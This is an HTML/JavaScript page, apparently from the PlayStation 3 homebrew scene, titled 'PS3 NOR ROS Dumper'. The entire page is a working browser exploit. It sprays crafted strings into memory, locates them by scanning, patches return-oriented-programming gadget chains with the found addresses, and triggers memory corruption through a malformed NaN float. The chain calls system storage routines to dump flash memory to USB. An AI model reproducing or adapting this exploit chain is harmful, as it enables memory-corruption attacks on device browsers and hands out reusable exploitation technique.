<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<script src="include/onload.js"></script>
<head>
<script>

var log_div = logEntry();
// FIXME the new_line requires a different tag on browser than on python console, a replacement algo needs implemented in dbg function call..
 //var new_line = "\r\n"; // Python console tag
var new_line = "<br>"; // browser tag
//
var used_offsets_arr = [80000000];
var usb_fp_rosdump,gadgets,jump_2,jump_1;
var usb_fp_rosdump_addr=0,gadgets_addr=0,jump_2_addr=0,jump_1_addr=0;
//var usb_fp_rosdump_bytecount=0x1B*2;
var usb_fp_rosdump_bytecount=0x1C*2;
var gadgets_bytecount=0x155*2;
var jump_2_bytecount=0x24*2;
var jump_1_bytecount=0x4*2;

var usb_fp_addr;		
var wb_addr;
//var flash_flag_addr;
var sso_addr;
var dev_handle_addr;
var readlen_addr;
var fd_addr;
var rosdump_addr;

var	_gadgets;

var fails = 0;
var restart = 0;

var s_base = 0;
var s_size = 0;
var last_addr = 0;

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len,used_offsets,_log_div) //search_base parameter value paased to this function must be aligned on 0x0 or 0x8 same as string allocation
{
	try
	{
		//var exploit=document.getElementById('exploit');
		//var temp=readMemory(exploit,search_base,search_size+6);
		//var dat=temp.substr(6,search_size);	// move past "local
		
		var temp=readMemory(document.getElementById('exploit'),search_base,search_size);
		//temp=temp.substr(0,temp.length-6);
		var dat=temp.substr(6,search_size);
		
		temp=null;
		//var dat=readMemory(exploit,search_base,search_size+6).substr(6,search_size);	// move past "local
		for (var i=0;i<(search_size*2);i+=0x10)	// loop searching for tag every 8 bytes due to alignment
		{
			if (dat.charCodeAt(i/2)==pattern)
			{
				var match=0;
				for (var k=0;k<(len*2);k+=0x2)	// loop next bytes for comparison
				{
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))	// convert to string for comparison
					{
						break;
					}
					match+=1;	// increment match
				}
				if (match==len)	// we got a complete match
				{
					var exploit_addr=search_base+i+2;	// hold exploit addr
					dbg("Found "+name+" at: 0x"+exploit_addr.toString(16),_log_div);	// display the exploit address
					var cont=0;
					if(used_offsets.length>0)
					{
						for(var idx=0;idx<used_offsets.length;idx++)
						{
							if(used_offsets[idx]==exploit_addr)
							{
								cont=1;
								break;
							}
						}
						if(cont==1)
						{
							dbg("0x"+exploit_addr.toString(16)+" is ignored.", _log_div);
							cont=0;
							continue;
						}
					}
					//used_offsets[used_offsets.length] = exploit_addr;
					used_offsets.push(exploit_addr);
					dbg("0x"+exploit_addr.toString(16)+" was added to used_offsets array.", _log_div);
					//mem=dat;
					dat=null;
					exploit=null;
					return exploit_addr;
				}
			}
		}
		//mem=dat;		
		dat=null;
		exploit=null;
		var end_range = search_base+search_size;
		dbg("[0x" + s_base.toString(16) + "]" + "[0x" + s_size.toString(16) + "]" + " / "+name+" not located in range 0x"+search_base.toString(16)+" - 0x"+end_range.toString(16), _log_div);
		return 0;
	} 
	catch(e) 
	{
		dbg(e, _log_div);
	}
}
function trigger(exploit_addr)
{
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}
function getAddressRosDump()
{
	try
	{
		//writeEnvInfo();		
		dbg("Searching memory range for usb_fp_rosdump string offset....", log_div);
		//usb_fp_rosdump=unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u726F\u7330\u2E68\u6578\u0000\u7762\u0000\u0100\u0000\u0000\u0004\u0000\u000B\uBBE8\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u7EFD");// 22 bytes for path to fopen + 4 bytes to store wb string + 8 bytes for nor flash flag + 8 bytes for sys_storage_open offset + 8 for file descriptor + 2 ros dump placeholder + 4 for place holders
		usb_fp_rosdump=unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u726F\u7330\u2E68\u6578\u0000\u7762\u0000\u0000\u4141\u4141\u4141\u4141\u000D\uEBD8\u0000\u4141\u4141\u4141\u4141\u4141\u7EFD");// 22 bytes for path to fopen + 4 bytes to store wb string + 8 bytes for nor flash flag + 8 bytes for sys_storage_open offset + 8 for file descriptor + 2 ros dump placeholder + 4 for place holders
		
		if (last_addr === 0){
			s_base = 0x80278000;
			s_size = 0x114000;
		}else{
			s_base = s_base+0x05000;
			s_size = s_size-0x05000;
		}
		
		if (s_base >= 0x80380000 || s_size <= 0x05000){
			s_base = 0x80278000;
			s_size = 0x114000;
		}
		do{
			//usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x0000));
			//usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x0001));
			//usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x0002));
			usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x7EFD));
			usb_fp_rosdump_addr=findJsVariableOffset("usb_fp_rosdump",usb_fp_rosdump,s_base,s_size,0x7EFD,usb_fp_rosdump_bytecount/2,used_offsets_arr, log_div);
			if (usb_fp_rosdump_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
		}while(usb_fp_rosdump_addr === 0 && fails<20);
		
		if (usb_fp_rosdump_addr === 0){
			do{
				usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x7EFD));
				usb_fp_rosdump_addr=findJsVariableOffset("usb_fp_rosdump",usb_fp_rosdump,s_base,s_size,0x7EFD,usb_fp_rosdump_bytecount/2,used_offsets_arr, log_div);
				if (usb_fp_rosdump_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
			}while(usb_fp_rosdump_addr === 0 && fails<40);
		}
		
		// DEX
		// \u4141 is used for general padding
		// other \u4x4x are used as placeholders for runtime replacement by js replaceAt calls
		// Other values like \u2424\u2424\u2424\u2424 means that this 8 byte value will eventually be loaded into r24 by one of the gadgets
		usb_fp_addr=usb_fp_rosdump_addr+0x00;		
		wb_addr=usb_fp_rosdump_addr+0x16;
		//flash_flag_addr= usb_fp_rosdump_addr+0x1A;
		sso_addr=usb_fp_rosdump_addr+0x24;
		dev_handle_addr=usb_fp_rosdump_addr-0x8;
		readlen_addr=usb_fp_rosdump_addr-0x12;
		fd_addr=usb_fp_rosdump_addr+0x2C;
		rosdump_addr=usb_fp_rosdump_addr+0x34;
		
		if (restart === 0){
			logAdd(s2hex(usb_fp_rosdump), log_div);
			
			document.getElementById("addresses").innerHTML += "&nbsp&nbsp&nbsp&nbsp&nbsp 0x" + usb_fp_rosdump_addr.toString(16);
		
			fails = 0;
			disableElement("get-address-ros-dump");
			enableElement("get-address-gadgets");
			disableElement("get-address-jump2");
			disableElement("get-address-jump1");
			disableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}else{
			fails = 0;
			restart = 0;
			last_addr = 1;
			enableElement("get-address-ros-dump");
			disableElement("get-address-gadgets");
			disableElement("get-address-jump2");
			disableElement("get-address-jump1");
			disableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}
	} 
	catch(e) 
	{
		dbg(e, log_div);
	}
}

function getAddressGadgets()
{
	try
	{
	
		dbg("Searching memory range for gadgets string offset....", log_div);
		//gadgets=unescape("\u0102\u0009\u76BC\uF2F2\uF2F2\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\uF2F2\uF2F2\uF2F2\uF2F2\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000\u0061\u61B8\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000\uFF05\uFF05\u0000\u0000\uFF03\uFF03\uFF09\uFF09\u9900\u0102\u0304\u0506\u0304\u0506\u0708\u0910\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\uFF31\uFF31\uFF31\uFF31\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u0000\u0000\u001A\u43FC\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0000\u0000\uFF03\uFF03\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152");//512 bytes
		gadgets=unescape("\u0102\u0009\u76BC\uF2F2\uF2F2\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\uF2F2\uF2F2\uF2F2\uF2F2\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000\u0061\u61B8\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000\uFF05\uFF05\u0000\u0000\uFF03\uFF03\uFF09\uFF09\u9900\u0102\u0304\u0506\u0304\u0506\u0708\u0910\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u0000\u0000\u001A\u43FC\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0100\u0000\u0000\u0004\u1516\u1718\u1920\u2122\u0000\u0000\u0061\u61B8\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u0000\u025A\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0200\u0000\u0001\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\uFF31\uFF31\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0043\u4368");//682 bytes
		gadgets=gadgets.replaceAt(0x11A/2,hexh2bin(dev_handle_addr>>16)); //sys_storage_open device handle offset
		gadgets=gadgets.replaceAt(0x11C/2,hexh2bin(dev_handle_addr));
		gadgets=gadgets.replaceAt(0x126/2,hexh2bin(sso_addr>>16)); //sys_storage_open for 0x0(r9) offset
		gadgets=gadgets.replaceAt(0x128/2,hexh2bin(sso_addr));
		gadgets=gadgets.replaceAt(0x24E/2,hexh2bin(rosdump_addr>>16)); //sys_storage_read buffer offset
		gadgets=gadgets.replaceAt(0x250/2,hexh2bin(rosdump_addr));
		gadgets=gadgets.replaceAt(0x252/2,hexh2bin(readlen_addr>>16)); //sys_storage_read readlen offset
		gadgets=gadgets.replaceAt(0x254/2,hexh2bin(readlen_addr));
		gadgets=gadgets.replaceAt(0x28E/2,hexh2bin(dev_handle_addr>>16)); //sys_storage_read device handle offset
		gadgets=gadgets.replaceAt(0x290/2,hexh2bin(dev_handle_addr));
		//gadgets=gadgets.replaceAt(0x1D6/2,hexh2bin(flash_flag_addr>>16)); //NOR Flash flag parameter offset
		//gadgets=gadgets.replaceAt(0x1D8/2,hexh2bin(flash_flag_addr));	
		
	
		gadgets=gadgets.replaceAt(0x00E/2,hexh2bin(usb_fp_addr>>16)); //filepath parameter offset
		gadgets=gadgets.replaceAt(0x010/2,hexh2bin(usb_fp_addr));
		gadgets=gadgets.replaceAt(0x00E/2,hexh2bin(wb_addr>>16)); //'wb' parameter offset
		gadgets=gadgets.replaceAt(0x010/2,hexh2bin(wb_addr));		
		gadgets=gadgets.replaceAt(0x00E/2,hexh2bin(rosdump_addr>>16)); //ros dump start offset
		gadgets=gadgets.replaceAt(0x010/2,hexh2bin(rosdump_addr));
		gadgets=gadgets.replaceAt(0x014/2,hexh2bin(fd_addr>>16)); //fd (file descriptor) parameter offset
		gadgets=gadgets.replaceAt(0x016/2,hexh2bin(fd_addr));
		
		if (last_addr === 0){
			s_base = 0x80180000;
			s_size = 0xF8000;
		}else{
			s_base = s_base+0x05000;
			s_size = s_size-0x05000;
		}
		
		if (s_base >= 0x80270000 || s_size <= 0x05000){
			s_base = 0x80180000;
			s_size = 0xF8000;
		}
		do{
			//gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x0000));
			//gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x0001));
			//gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x0002));
			_gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x2A2F));
			gadgets_addr=findJsVariableOffset("gadgets",_gadgets,s_base,s_size,0x2A2F,gadgets_bytecount/2,used_offsets_arr, log_div);
			//gadgets_addr=findJsVariableOffset("gadgets",gadgets,0x80180000,0xF8000,0x7EFC,0x100,used_offsets_arr, log_div);
			if (gadgets_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
		}while(gadgets_addr === 0 && fails<20);
		
		if (gadgets_addr === 0){
			s_base = s_base+0x05000;
			s_size = s_size-0x05000;
			do{
			_gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x2A2F));
			gadgets_addr=findJsVariableOffset("gadgets",_gadgets,s_base,s_size,0x2A2F,gadgets_bytecount/2,used_offsets_arr, log_div);
			if (gadgets_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
		}while(gadgets_addr === 0 && fails<40);
		}
		
		if (restart === 0){
			logAdd(s2hex(_gadgets), log_div);
			
			document.getElementById("addresses").innerHTML += "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp / &nbsp&nbsp&nbsp&nbsp&nbsp 0x" + gadgets_addr.toString(16);
			
			fails = 0;
			disableElement("get-address-ros-dump");
			disableElement("get-address-gadgets");
			enableElement("get-address-jump2");
			disableElement("get-address-jump1");
			disableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}else{
			fails = 0;
			restart = 0;
			last_addr = 1;
			disableElement("get-address-ros-dump");
			enableElement("get-address-gadgets");
			disableElement("get-address-jump2");
			disableElement("get-address-jump1");
			disableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}
	} 
	catch(e) 
	{
		dbg(e, log_div);
	}
}

function getAddressJump2()
{
	try
	{
	
		//dbg("Dumping 0x"+gadgets_bytecount.toString(16)+" bytes from gadgets_addr:");
		//send_read(gadgets_addr-0x2,gadgets_bytecount, log_div);
		dbg("Searching memory range for jump_2 string offset....", log_div);
		jump_2=unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7EFB"); // 72 bytes
		jump_2=jump_2.replaceAt(0x32/2,hexh2bin(gadgets_addr>>16)); //gadgets offset
		jump_2=jump_2.replaceAt(0x34/2,hexh2bin(gadgets_addr));	
		
		if (last_addr === 0){
			s_base = 0x80180000;
			s_size = 0x450000;
		}else{
			s_base = s_base+0x05000;
			s_size = s_size-0x05000;
		}
		
		if (s_base >= 0x805C0000 || s_size <= 0x05000){
			s_base = 0x80180000;
			s_size = 0x450000;
		}
		do{
			//jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x0000));
			//jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x0001));
			//jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x0002));
			jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x7EFB));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,s_base,s_size,0x7EFB,jump_2_bytecount/2,used_offsets_arr, log_div);
			if (jump_2_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
		}while(jump_2_addr==0 && fails<20);
		
		if (jump_2_addr === 0){
			s_base = s_base+0x05000;
			s_size = s_size-0x05000;
			do{
				jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x7EFB));
				jump_2_addr=findJsVariableOffset("jump_2",jump_2,s_base,s_size,0x7EFB,jump_2_bytecount/2,used_offsets_arr, log_div);
				if (jump_2_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
			}while(jump_2_addr==0 && fails<40);
		}
		
		if (restart === 0){
			logAdd(s2hex(jump_2), log_div);
			
			document.getElementById("addresses").innerHTML += "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp / &nbsp&nbsp&nbsp&nbsp&nbsp 0x" + jump_2_addr.toString(16);
		
			fails = 0;
			disableElement("get-address-ros-dump");
			disableElement("get-address-gadgets");
			disableElement("get-address-jump2");
			enableElement("get-address-jump1");
			disableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}else{
			fails = 0;
			restart = 0;
			last_addr = 1;
			disableElement("get-address-ros-dump");
			disableElement("get-address-gadgets");
			enableElement("get-address-jump2");
			disableElement("get-address-jump1");
			disableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}
		
	} 
	catch(e) 
	{
		dbg(e, log_div);
	}
}

function getAddressJump1()
{
	try
	{
		
		dbg("Searching memory range for jump_1 string offset....", log_div);
		jump_1=unescape("\u4141\u4141\u4141\u7EFA"); // 8 bytes == 4 bytes + 4 bytes placeholders
		jump_1=jump_1.replaceAt(0x02/2,hexh2bin(jump_2_addr>>16)); //jump_2 offset
		jump_1=jump_1.replaceAt(0x04/2,hexh2bin(jump_2_addr));	
		
		if (last_addr === 0){
			s_base = 0x80180000;
			s_size = 0x450000;
		}else{
			s_base = s_base+0x05000;
			s_size = s_size-0x05000;
		}
		
		if (s_base >= 0x805C0000 || s_size <= 0x05000){
			s_base = 0x80180000;
			s_size = 0x450000;
		}
		do{
			//jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x0000));
			//jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x0001));
			//jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x0002));
			jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x7EFA));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,s_base,s_size,0x7EFA,jump_1_bytecount/2,used_offsets_arr, log_div);
			if (jump_1_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
		}while(jump_1_addr==0 && fails<20);
		
		if (jump_1_addr === 0){
			s_base = s_base+0x05000;
			s_size = s_size-0x05000;
			do{
				jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x7EFA));
				jump_1_addr=findJsVariableOffset("jump_1",jump_1,s_base,s_size,0x7EFA,jump_1_bytecount/2,used_offsets_arr, log_div);
				if (jump_1_addr === 0){fails+=1; restart=1; last_addr = 1;}else {restart=0;}
			}while(jump_1_addr==0 && fails<40);
		}
		
		if (restart === 0){
			logAdd(s2hex(jump_1), log_div);
			
			document.getElementById("addresses").innerHTML += "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp / &nbsp&nbsp&nbsp&nbsp&nbsp 0x" + jump_1_addr.toString(16);
		
			fails = 0;
			disableElement("get-address-ros-dump");
			disableElement("get-address-gadgets");
			disableElement("get-address-jump2");
			disableElement("get-address-jump1");
			enableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}else{
			fails = 0;
			restart = 0;
			last_addr = 1;
			disableElement("get-address-ros-dump");
			disableElement("get-address-gadgets");
			disableElement("get-address-jump2");
			enableElement("get-address-jump1");
			disableElement("rop-finish");
			disableElement("do-trigger");
			
			return;
		}
		
	} 
	catch(e) 
	{
		dbg(e, log_div);
	}
}

function ropFinish()
{
	try
	{
		
		dbg("Summary:");
		dbg("rosdump variable offset: 0x"+usb_fp_rosdump_addr.toString(16), log_div);
		send_read(readMemory(document.getElementById('exploit'),usb_fp_rosdump_addr-0x2,usb_fp_rosdump_bytecount+0x4).substr(6,usb_fp_rosdump_bytecount), parseInt("0x"+(usb_fp_rosdump_addr-0x2), 16), usb_fp_rosdump_bytecount, log_div);
		dbg("gadget: "+bytesToHex(usb_fp_rosdump), log_div);
		send_dump_name(readMemory(document.getElementById('exploit'),usb_fp_rosdump_addr-0x2,usb_fp_rosdump_bytecount+0x4).substr(6,usb_fp_rosdump_bytecount), usb_fp_addr-0x2, usb_fp_rosdump_bytecount, "test.bin");
		dbg("gadgets variable offset: 0x"+gadgets_addr.toString(16), log_div);
		send_read(readMemory(document.getElementById('exploit'),gadgets_addr-0x2,gadgets_bytecount+0x4).substr(6,gadgets_bytecount), gadgets_addr-0x2, gadgets_bytecount, log_div);
		dbg("gadget: "+bytesToHex(_gadgets), log_div);
		dbg("jump_2 variable offset: 0x"+jump_2_addr.toString(16), log_div);
		send_read(readMemory(document.getElementById('exploit'),jump_2_addr-0x2,jump_2_bytecount+0x2).substr(6,jump_2_bytecount), jump_2_addr-0x2, jump_2_bytecount, log_div);
		dbg("gadget: "+bytesToHex(jump_2), log_div);
		dbg("jump_1 variable offset: 0x"+jump_1_addr.toString(16), log_div);
		send_read(readMemory(document.getElementById('exploit'),jump_1_addr-0x2,jump_1_bytecount+0x2).substr(6,jump_1_bytecount), jump_1_addr-0x2, jump_1_bytecount, log_div);
		dbg("gadget: "+bytesToHex(jump_1), log_div);
		dbg("READY TO TRIGGER EXPLOIT!", log_div);
		//dbg("Triggering exploit....", log_div);
		//alert("Ready to trigger!");
		//trigger(jump_1_addr);
		
		// To avoid garbage collection...
		//logAdd(s2hex(usb_fp_rosdump), log_div);
		//logAdd(s2hex(_gadgets), log_div);
		//logAdd(s2hex(jump_2), log_div);
		//logAdd(s2hex(jump_1), log_div);
			
		document.getElementById("addresses").innerHTML += "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp / &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp READY!";
		
		disableElement("get-address-ros-dump");
		disableElement("get-address-gadgets");
		disableElement("get-address-jump2");
		disableElement("get-address-jump1");
		disableElement("rop-finish");
		enableElement("do-trigger");
		

		return;
	} 
	catch(e) 
	{
		dbg(e, log_div);
	}
}

function prepareButtons(){
	enableElement("get-address-ros-dump");
	disableElement("get-address-gadgets");
	disableElement("get-address-jump2");
	disableElement("get-address-jump1");
	disableElement("rop-finish");
	disableElement("do-trigger");
}

function enableElement(elem){
	document.getElementById(elem).disabled = false;
}

function disableElement(elem){
	document.getElementById(elem).disabled = true;
}

function doTrigger(){
	trigger(jump_1_addr);
}
</script>
</head>
<body id="BodyID" onload="prepareButtons();">
		<h1>PS3 NOR ROS Dumper 0.1 alpha</h1><br>
		Courtesy of Willerson Stockler, esc0rtd3w & bguerville<br/><br>
		With many thanks to Joonie & zecoxao for their regular advice, friendly support & extra testing...<br>
		More details & news on psx-place.com, source code repository: http://www.github.com/cool_team_name/<br><br>
		Check the log below.. If the exploit was triggered, the event will be logged... Otherwise refresh the browser...<br><br>
		
		<button id="get-address-ros-dump" onclick="getAddressRosDump();">getAddressRosDump</button> &nbsp/&nbsp
		<button id="get-address-gadgets" onclick="getAddressGadgets();" disabled>getAddressGadgets</button> &nbsp/&nbsp
		<button id="get-address-jump2" onclick="getAddressJump2();" disabled>getAddressJump2</button> &nbsp/&nbsp
		<button id="get-address-jump1" onclick="getAddressJump1();" disabled>getAddressJump1</button> &nbsp/&nbsp
		<button id="rop-finish" onclick="ropFinish();" disabled>ropFinishChain</button> &nbsp/&nbsp
		<button id="do-trigger" onclick="doTrigger();" disabled><b>Trigger</b></button>
		<div id="addresses" /></div>
		
		<div id="exploit" /></div>
		<br>
		<div id="log"></div>
		<div id="trigger"></div><br>
	</body>
</html>
